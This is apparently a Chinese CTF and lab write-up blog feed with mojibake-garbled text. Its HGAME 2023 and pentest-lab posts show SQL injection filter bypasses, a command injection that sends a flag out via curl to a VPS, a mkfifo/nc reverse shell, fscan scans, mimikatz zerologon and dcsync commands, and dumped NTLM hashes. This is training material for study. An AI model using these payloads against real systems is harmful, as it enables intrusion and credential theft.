class="string">&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#or</span></span><br><span class="line"><span class="comment">#p.sendline(&#x27;ls 1&gt;&amp;0&#x27;)</span></span><br><span class="line"><span class="comment">#p.sendline(&#x27;cat flag 1&gt;&amp;0&#x27;)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230207170801337.png" alt="image-20230207170801337"></p><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h3><h4 id="Git-Leakage"><a href="#Git-Leakage" class="headerlink" title="Git Leakage"></a>Git Leakage</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/GitHack/dist]</span><br><span class="line">â””â”€<span class="comment"># cd week-2.hgame.lwsec.cn_31248</span></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/GitHack/dist/week-<span class="number">2.</span>hgame.lwsec.cn_31248]</span><br><span class="line">â””â”€<span class="comment"># ls</span></span><br><span class="line">Th1s_1s-flag</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/GitHack/dist/week-<span class="number">2.</span>hgame.lwsec.cn_31248]</span><br><span class="line">â””â”€<span class="comment"># cat Th1s_1s-flag</span></span><br><span class="line">hgame&#123;Don<span class="string">&#x27;t^put*Git-in_web_directory&#125;</span></span><br></pre></td></tr></table></figure><h4 id="v2board"><a href="#v2board" class="headerlink" title="v2board"></a>v2board</h4><p><a href="https://www.youtube.com/watch?v=yfneS2R-Pn8&amp;ab_channel=%E4%B8%8D%E8%89%AF%E6%9E%97">https://www.youtube.com/watch?v=yfneS2R-Pn8&amp;ab_channel=%E4%B8%8D%E8%89%AF%E6%9E%97</a></p><h4 id="Search-Commodity"><a href="#Search-Commodity" class="headerlink" title="Search Commodity"></a>Search Commodity</h4><p>å¼±å£ä»¤ï¼Œçˆ†ç ´ä¸€ä¸‹</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230213151310768.png" alt="image-20230213151310768"></p><p>user01<br>admin123</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">search_id=1  æ˜¾ç„¶æ³¨å…¥äº†</span><br><span class="line">search_id=1/**/order/**/by/**/1    //Error Occurred  ç©ºæ ¼è¢«è¿‡æ»¤ /**/</span><br><span class="line">search_id=1/*123*/order/*123*/by/*123*/1    //Error Occurred  /**/ è¢«è¿‡æ»¤ ç”¨/*123*/ æ›¿æ¢</span><br><span class="line">search_id=1/*123*/order/*123*/by/*123*/1    //Error Occurred</span><br><span class="line">//è¿™é‡Œè¯­å¥æ²¡æœ‰é—®é¢˜ï¼ŒçŒœæµ‹æ˜¯orè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬åœ¨åŠ ä¸€ä¸ªor</span><br><span class="line">search_id=1/*123*/oorrder/*123*/by/*123*/1    //hard disk1</span><br><span class="line">//è¿™é‡Œoorrder æˆåŠŸï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹åå°æ˜¯å§oræ›¿æ¢ä¸ºç©ºäº†,</span><br><span class="line">æ³¨å‡º3ä¸ªå­—æ®µ</span><br><span class="line">search_id=-1/*1123*/union/*1123*/select/*2123*/2,3,4     //Error Occurred</span><br><span class="line">è¿™é‡ŒçŒœæµ‹æ˜¯union select æ›¿æ¢äº†ï¼Œå› ä¸ºä¸Šé¢ä¹Ÿoræ›¿æ¢äº†</span><br><span class="line">search_id=-1/*1123*/ununionion/*1123*/selselectect/*2123*/2,3,4</span><br><span class="line">or  å¤§å°å†™</span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,3,database() //Error Occurred</span><br><span class="line"></span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,Database(),4 //database  åŒå†™orå¤§å†™ //se4rch   4</span><br><span class="line"></span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,Group_concat(table_name)/*2123*/frOm/*2123*/infoorrmation_schema.tables/*2123*/whEre/*2123*/table_schema/*2123*/like/*2123*/&#x27;se4rch&#x27;</span><br><span class="line"></span><br><span class="line">è·å–è¡¨å</span><br><span class="line"></span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,datadatabasebase(),4</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h3><h4 id="Ping-To-The-Host"><a href="#Ping-To-The-Host" class="headerlink" title="Ping To The Host"></a>Ping To The Host</h4><p>ping to host<br>æ— å›æ˜¾</p><p>vpsç›‘å¬ <code>nc -lkvvnp 7777</code></p><p>æœ‰è¿‡æ»¤  å¦‚æœä¸åŠ base64   ä¼šä¸æ˜¾ç¤º</p><p>ip=127.0.0.1%26%26curl%09<a href="http://182.92.176.62:7777/%60nl%09/f*|base64%60">http://182.92.176.62:7777/`nl%09/f*|base64`</a>  </p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230201105313163.png" alt="image-20230201105313163"></p><p>/ICAgICAxCWhnYW1le3AxbkdfdDBfQ29tTTRuRF9FeGVjVXQxb25fZEFuZ0VyUnJSclJyUiF9Cg==</p><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="web-3"><a href="#web-3" class="headerlink" title="web"></a>web</h3><h4 id="Tell-Me"><a href="#Tell-Me" class="headerlink" title="Tell Me"></a>Tell Me</h4><p>bind xxe</p><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="ezwin"><a href="#ezwin" class="headerlink" title="ezwin"></a>ezwin</h4><p>è¿™ä¸ªé¢˜æ¯”è¾ƒæœ‰æ„æ€äº†ï¼Œè¿™é‡ŒVolatility 3 å’ŒVolatility 2æœ‰æˆªç„¶ä¸åŒçš„ç»“æœï¼Œä¸æ˜¯å¾ˆç†è§£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# python3 vol.py -f /tools/ctf/2023hgame/win10_22h2_19045.2486.vmem windows.envars.Envars | grep hgame</span><br><span class="line">3492resssihost.exe      0x222e2561bc0canHGAME_FLAGhed   hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3520    svchost.exe     0x1d2f6e033d0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3528    svchost.exe     0x163d90033d0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3668    taskhostw.exe   0x1ced6651bc0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3828    ctfmon.exe      0x1e2d9081bc0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3992    explorer.exe    0x1151bf0       HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€# python2 vol.py -f /tools/ctf/hgame/win10_22h2_19045.2486.vmem --profile=Win10x64_19041 envars | grep hgame</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">    3492 sihost.exe           0x00000222e2560fe0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3520 svchost.exe          0x000001d2f6e027f0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3528 svchost.exe          0x00000163d90027f0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3668 taskhostw.exe        0x000001ced6650fe0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3828 ctfmon.exe           0x000001e2d9080fe0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3992 explorer.exe         0x0000000006607a60 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Bohemian)-[/tools/volatility3]</span><br><span class="line">â””â”€<span class="comment"># python3 vol.py -f /tools/ctf/2023hgame/win10_22h2_19045.2486.vmem windows.hashdump</span></span><br><span class="line">Volatility 3 Framework 2.4.1</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">User    rid     lmhash  nthash</span><br><span class="line"></span><br><span class="line">Administrator   500     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">Guest   501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">DefaultAccount  503     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">WDAGUtilityAccount      504     aad3b435b51404eeaad3b435b51404ee        c4b2cf9cac4752fc9b030b8ebc6faac3</span><br><span class="line">Noname  1000    aad3b435b51404eeaad3b435b51404ee        84b0d9c9f830238933e7131d60ac6436</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€# python2 vol.py -f /tools/ctf/hgame/win10_22h2_19045.2486.vmem --profile=Win10x64_19041 hashdump</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Administrator:500:6a21484f766d3766175c3a3f7763e688:b08b01ca485aea836bacb3aad6c45b26:::</span><br><span class="line">Guest:501:6a0af1d516e75dd696266273ce666e21:82e20e246547aa3ae431aec52f53cdf5:::</span><br><span class="line">DefaultAccount:503:ce2bccae5ac352b8e38c1d3194475940:4a947667f1ab4136246644fa344650b3:::</span><br><span class="line">WDAGUtilityAccount:504:efa88db8c9ac1b9f5798999b03241b90:611c4a5c71e01e167d8ef049135ff150:::</span><br><span class="line">Noname:1000:f4272abfe4b751256f7b4a0932246690:3454cf62689ec53e97581f7a3312c3a9:::</span><br></pre></td></tr></table></figure><p>volatility 2 filescan æ—¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ªflag.7z é¢˜ç›®æç¤ºä¹Ÿç»™äº†ï¼Œè¿™é‡Œdumpfilesæ—¶ -q æå–ä¸æ¥ä¸œè¥¿ï¼Œ</p><p>ä½†æ˜¯å¯ä»¥-pid æ‰¾åˆ°å‹ç¼©æ–‡ä»¶çš„è¿›ç¨‹å·ï¼Œè¿™æ ·ä¼šæå–å‡ºæ¥ä¸€ä¸‹æ— å…³çš„æ–‡ä»¶ï¼Œå†™ä¸ªç®€å•è„šæœ¬ çœ‹çœ‹é‚£ä¸ªæ˜¯zip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> ./*</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        file <span class="variable">$file</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216150417789.png" alt="image-20230216150417789"></p><p>å¯ä»¥çœ‹åˆ°ä¸¤ä¸ª7-zipæ–‡ä»¶ï¼Œæ‹–åˆ°winä¸‹  ç„¶åè§£ä¸€ä¸‹</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216151102965.png" alt="image-20230216151102965"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ª6270çš„datæ–‡ä»¶å¯ä»¥è§£å‹å‡ºæ¥ä¸œè¥¿ï¼Œä½†æ˜¯å‘¢ï¼Œè¿™ä¸ªtxtè¢«wannarenåŠ å¯†äº†ï¼Œç»è¿‡æœç´¢ï¼Œç«ç»’æœ‰ä¸€ä¸ªå¯ä»¥è§£å¯†çš„è½¯ä»¶</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216152439725.png" alt="image-20230216152439725"></p><p>æ–°ä½›æ›°ï¼Œè§£å‡ºæ¥æäº¤å‘ç°ä¸å¯¹ï¼Œé—®äº†ä¸€ä¸‹å‡ºé¢˜äººï¼Œå‘ç°ä¸å¯¹ï¼Œè¯´è¦ç”¨volatility 3ï¼Œé¢˜ç›®å…¶å®ä¹Ÿæç¤ºäº†è¦ç”¨ä¸‰ï¼Œå½“æ—¶æœºå™¨æ²¡æœ‰ä¸‰ï¼Œæˆ‘å°±ç”¨ä¸‰é‡æ–°åšä¸€éï¼Œä¸€æ ·çš„æ­¥éª¤ï¼Œæå‡ºæ¥çš„å°±ä¸è¦ä¸€æ ·ã€‚åæ¥æˆ‘å»æœäº†è¿™ä¸ªæ–°ä½›æ›°çš„ç ï¼Œå‘ç°æ˜¯2022å¹´çš„é¢˜ã€‚åŒä¸€ä¸ªç¯å¢ƒä½†æ˜¯æå‡ºæ¥çš„å‹ç¼©åŒ…ä¸ä¸€æ ·ï¼Œä¸å¤ªæ¸…æ¥šã€‚</p><p>ç”¨volatility 3ä»æ–°åšä¸€ä¸‹ï¼Œ</p><p>python3 vol.py -f /tools/ctf/2023hgame/win10_22h2_19045.2486.vmem windows.dumpfiles â€“pid 7584</p><p>è¿™é‡Œæˆ‘ä½¿ç”¨è¿™ä¸ªå‘½ä»¤æçš„ï¼Œè¿™æ ·ä¼šæå‡ºæ¥ä¸€å¤§å †æ–‡ä»¶ï¼ŒåŒæ ·ç”¨è„šæœ¬åˆ¤æ–­ä¸€ä¸‹é‚£ä¸ªzip,è¿™ä¸ªæ ¹æ®åå­—ä¹Ÿèƒ½å¤§æ¦‚çŒœå‡º</p><p>file.0xd00641b5ba70.0xd00641180e30.DataSectionObject.flag.7z.dat</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216153755607.png" alt="image-20230216153755607"></p><p>æ‰“å¼€å¯ä»¥çœ‹åˆ°å¯†ç æ˜¯è§£å‡ºæ¥hash</p><p>84b0d9c9f830238933e7131d60ac6436</p><p>æŸ¥è¯¢ç»“æœï¼š asdqwe123</p><p>å°±å¯ä»¥äº†</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2022å¼±å£ä»¤å®‰å…¨å®éªŒå®¤æ‹›æ–°èµ›-é¶æœºæŒ‘æˆ˜</title>
      <link href="/2023/01/05/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9B-%E9%9D%B6%E6%9C%BA%E6%8C%91%E6%88%98/"/>
      <url>/2023/01/05/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9B-%E9%9D%B6%E6%9C%BA%E6%8C%91%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230105144545334.png" alt="image-20230105144545334"></p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230105144556972.png" alt="image-20230105144556972"></p><p><a href="https://www.iculture.cc/rce/">https://www.iculture.cc/rce/</a></p><p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 192.168.144.128 9990 &gt;/tmp/f</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230105145002174.png" alt="image-20230105145002174"></p><p>setg Proxies socks5:192.168.144.128:1080 #è®¾ç½®å…¨å±€ä»£ç†<br>set ReverseAllowProxy true #è¿™ä¸ªå‚æ•°æ˜¯å› ä¸ºä½¿ç”¨å…¨å±€ä»£ç†ï¼Œå¯èƒ½ä¼šå¯¼è‡´æˆ‘ä»¬çš„shellæ— æ³•åå¼¹ï¼Œæ‰€ä»¥éœ€è¦å¼€å¯ã€‚</p><p>setg Proxies socks5:192.168.144.136:8888 #è®¾ç½®å…¨å±€ä»£ç†<br>set ReverseAllowProxy true #è¿™ä¸ªå‚æ•°æ˜¯å› ä¸ºä½¿ç”¨å…¨å±€ä»£ç†ï¼Œå¯èƒ½ä¼šå¯¼è‡´æˆ‘ä»¬çš„shellæ— æ³•åå¼¹ï¼Œæ‰€ä»¥éœ€è¦å¼€å¯ã€‚</p><p>:&gt;fscan.exe -h 192.168.48.1/24<br>fscan.exe -h 192.168.48.1/24</p><hr><p>  / _ \     ___  ___ _ __ __ _  <em><strong>| | __<br> / /<em>/</em></strong></em>/ __|/ <strong>| â€˜</strong>/ <em>` |/ <strong>| |/ /<br>/ /<em>\_</em></strong></em>__ \ (<strong>| | | (_| | (</strong>|   &lt;<br>____/     |___/___|_|  __,_|___|_|_<br>                     fscan version: 1.6.3<br>start infoscan<br>(icmp) Target â€˜192.168.48.128â€™ is alive<br>(icmp) Target â€˜192.168.48.200â€™ is alive<br>icmp alive hosts len is: 2<br>192.168.48.200:139 open<br>192.168.48.128:139 open<br>192.168.48.128:88 open<br>192.168.48.200:445 open<br>192.168.48.128:445 open<br>192.168.48.200:135 open<br>192.168.48.128:135 open<br>alive ports len is: 7<br>start vulscan<br>[+] 192.168.48.200      MS17-010        (Windows Server 2008 R2 Datacenter 7600)<br>[<em>] 192.168.48.200       WEAK\WIN-S96L5Q5A734   Windows Server 2008 R2 Datacenter 7600<br>NetInfo:<br>[*]192.168.48.128<br>   [-&gt;]WIN-JK2FG246GEF<br>   [-&gt;]192.168.48.128<br>[</em>] 192.168.48.128 [+]DC WEAK\WIN-JK2FG246GEF   Windows Server 2008 R2 Datacenter 7600<br>[+] 192.168.48.128      MS17-010        (Windows Server 2008 R2 Datacenter 7600)<br>å·²å®Œæˆ 9/9<br>scan end</p><p>WIN-JK2FG246GEF$</p><p>kiwi_cmd â€œlsadump::zerologon /target:192.168.48.128 /account:WIN-JK2FG246GEF$â€ exit</p><p>mimikatz.exe â€œlsadump::zerologon /target:192.168.48.128 /account:DC01$â€ exit</p><p>kiwi_cmd â€œlsadump::dcsync /domain:WEAK.COM /dc:WIN-JK2FG246GEF.WEAK.COM /user:administrator /authuser:WIN-JK2FG246GEF$ /authdomain:WEAK /authpassword: /authntlmâ€</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulntarget-c</title>
      <link href="/2022/11/29/vulntarget-c/"/>
      <url>/2022/11/29/vulntarget-c/</url>
      
        <content type="html"><![CDATA[<h3 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><p>ç›¸å…³æ¼æ´æŠ€æœ¯ï¼šlaravelã€OVAS-PHPç›¸å…³æ¼æ´ã€éš§é“ä»£ç†ã€å…æ€ã€ææƒã€CVE-2021-3129<br>ã€CVE-2021-3493ç­‰<br>ä¸‹è½½åœ°å€ï¼š<br>ç™¾åº¦äº‘é“¾æ¥:<br><a href="https://pan.baidu.com/s/1p3GDd7V3Unmq3-wSAvl7_Q">https://pan.baidu.com/s/1p3GDd7V3Unmq3-wSAvl7_Q</a><br>æå–ç : 1p9p</p><p>å…¶ä¸­vulntarget-cæ˜¯æœ¬æ¬¡ç¯å¢ƒ</p><p>githubåœ°å€ï¼š</p><p><a href="https://github.com/crow821/vulntarget">https://github.com/crow821/vulntarget</a></p><h4 id="æ‹“æ‰‘å›¾"><a href="#æ‹“æ‰‘å›¾" class="headerlink" title="æ‹“æ‰‘å›¾"></a>æ‹“æ‰‘å›¾</h4><p><img src="/images/vulntarget-e/image-20221129102253692.png" alt="image-20221129102253692"></p><h4 id="vmç½‘å¡é…ç½®"><a href="#vmç½‘å¡é…ç½®" class="headerlink" title="vmç½‘å¡é…ç½®"></a>vmç½‘å¡é…ç½®</h4><p>å°†ç™¾åº¦ç½‘ç›˜çš„é¶åœºcä¸‹è½½ä¸‹æ¥ï¼Œä½¿ç”¨vmæ‰“å¼€ï¼Œæˆ‘ä»¬å…ˆç¼–è¾‘ä¸€ä¸‹è™šæ‹Ÿç½‘å¡ç½‘æ®µ</p><p><img src="/images/vulntarget-e/image-20221129102606686.png" alt="image-20221129102606686"></p><p>è¿™é‡Œè¦æ³¨æ„ä¸å‹¾é€‰å°†ä¸»æœºè™šæ‹Ÿè¿æ¥åˆ°æ­¤ç½‘ç»œï¼Œå¦‚æœå‹¾é€‰çš„è¯ï¼Œä½ ä¼šå‘ç°ï¼Œæˆ‘ä»¬ç›´æ¥èƒ½ä»ä¸»æœºpingåˆ°10ï¼Œ20æ®µï¼Œè¿™æ ·å°±ä¸æ˜¯å†…ç½‘äº†ã€‚</p><p>ç¬¬ä¸€å°æ˜¯ubuntu20</p><p><img src="/images/vulntarget-e/image-20221129102818958.png" alt="image-20221129102818958"></p><p>ç¬¬äºŒå°win2016</p><p><img src="/images/vulntarget-e/image-20221129102845711.png" alt="image-20221129102845711"></p><p>ç¬¬ä¸‰å°ubuntu16</p><p><img src="/images/vulntarget-e/image-20221129102914418.png" alt="image-20221129102914418"></p><p>è®¾ç½®å¥½ä¹‹åå¼€æœºï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€ç‚¹é—®é¢˜ï¼Œé»˜è®¤ä½œè€…é…ç½®çš„æ—¶å€™ç»™åˆ°çš„æ˜¯é™æ€ip30æ®µçš„ï¼Œæˆ‘ä»¬éœ€è¦æ”¹ä¸€ä¸‹ï¼Œæˆ‘è¿™è¾¹netæ˜¯144æ®µçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»™ç½‘å¡ä¸€ä¸ª144æ®µçš„é™æ€IPå°±å¯ä»¥äº†</p><p><code>è´¦å¯†1ï¼švulntarget/root</code><br><code>è´¦å¯†2ï¼šroot/root#qwe</code></p><p>ç”¨rootè´¦å·ç™»å½•ä¸€ä¸‹ï¼Œæ”¹æ‰ç½‘å¡é…ç½®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su</span><br><span class="line">root<span class="comment">#qwe</span></span><br><span class="line">vim /etc/netplan/00-installer-config.yaml <span class="comment">#ç¼–è¾‘ç½‘å¡é…ç½®æ–‡ä»¶</span></span><br><span class="line">:wq</span><br><span class="line">netplan apply <span class="comment">#é‡å¯ç½‘å¡</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129103520466.png" alt="image-20221129103520466"></p><p><img src="/images/vulntarget-e/image-20221129103635589.png" alt="image-20221129103635589"></p><p>è¿™é‡Œæ³¨æ„ç½‘å…³ä¹Ÿæ”¹ä¸€ä¸‹ï¼Œå½“ç„¶è¿™é‡Œç½‘å¡ä¸å”¯ä¸€ï¼Œæˆ‘è¿™æ ·åé¢æ¯”è¾ƒç®€å•ä¸éœ€è¦æ”¹ç½‘å¡é…ç½®æ–‡ä»¶äº†</p><p>æˆ‘ä»¬ç®€å•æ‰«ä¸€ä¸‹<img src="/images/vulntarget-e/image-20221129104349743.png" alt="image-20221129104349743"></p><p>å¯ä»¥çœ‹åˆ°55çš„ipå¼€ç€80å’Œ22ï¼Œè®¿é—®ä¸€ä¸‹</p><p><img src="/images/vulntarget-e/image-20221129104507816.png" alt="image-20221129104507816"></p><p>è‡³æ­¤åœ¨vmä¸Šç¯å¢ƒæ­å»ºå·²ç»å®Œæˆ</p><h3 id="laravelæ¸—é€-CVE-2021-3129"><a href="#laravelæ¸—é€-CVE-2021-3129" class="headerlink" title="laravelæ¸—é€-CVE-2021-3129"></a>laravelæ¸—é€-CVE-2021-3129</h3><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªlaravelçš„æ¡†æ¶ç½‘ç«™ï¼Œæ—¢ç„¶é¶åœºï¼Œé‚£è‚¯å®šå­˜åœ¨æ¼æ´ï¼Œåœ¨å³ä¸‹è§’æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°Laravel v8.78.1 (PHP v7.4.3)ï¼Œé‚£è‚¯å®šæ˜¯å¤ç°laravelå†å²æ¼æ´äº†ã€‚ç½‘ä¸Šæœä¸€ä¸‹ç‰ˆæœ¬å·ï¼Œ(å¯ä»¥çœ‹åˆ°å…¶ä»–ä½¬å‘çš„è¿™ä¸ªé¶åœºwpï¼Œç¡®å®šCVE-2021-3129),å‘ç°æ˜¯2021-3129ï¼Œåæ­£æˆ‘æ˜¯æ²¡æœ‰å‘ç°ï¼Œå› ä¸ºçœ‹æ–‡ç« éƒ½æ˜¯è¯´å½±å“ç‰ˆæœ¬åœ¨Laravel&lt;=8.4.2,<code>https://www.freebuf.com/vuls/280508.html</code>,ä½†æ˜¯é¶æœºç¯å¢ƒåœ¨8.78ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ï¼Œ<code>Ignitionï¼ˆ&lt;=2.5.1ï¼‰</code>,è¿™ä¸ªæ’ä»¶çš„ç‰ˆæœ¬çš„é—®é¢˜ï¼Œè¿™ä¸ªæ–‡ç« è¯´çš„ï¼Œ<code>https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g</code><br>emmmmå°±å½“å‘ç°äº†å§ã€‚æˆ‘ä»¬å»å¤ç°ä¸€ä¸‹ã€‚</p><p>é¦–å…ˆè‚¯å®šæ˜¯githubæ‰¾å„ç§pocï¼Œæˆ‘ä¹Ÿæ‰¾äº†å„ç§pocï¼Œéƒ½æ‰“äº†ä¸€éï¼Œemmmmï¼Œéƒ½æ²¡æ‰“é€šï¼Œä¸æ˜¯phpæŠ¥é”™å°±æ˜¯not fund rce ï¼Œå¯èƒ½æ˜¯kaliçš„é—®é¢˜ï¼Œæ²¡æœ‰å»å…¶ä»–ç³»ç»Ÿæµ‹è¯•ï¼Œæœ‰å…´è¶£çš„å°ä¼™ä¼´æµ‹è¯•ä¸€ä¸‹ã€‚</p><p><code>http://wiki.peiqi.tech/wiki/frame/Laravel/Laravel%20Debug%E6%A8%A1%E5%BC%8F%20_ignition%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-3129.html</code><br><code>https://github.com/SNCKER/CVE-2021-3129</code><br><code>https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</code></p><p><img src="/images/vulntarget-e/image-20221129174149286.png" alt="image-20221129174149286"></p><p><img src="/images/vulntarget-e/image-20221129174203408.png" alt="image-20221129174203408"></p><p>è¿™å‡ 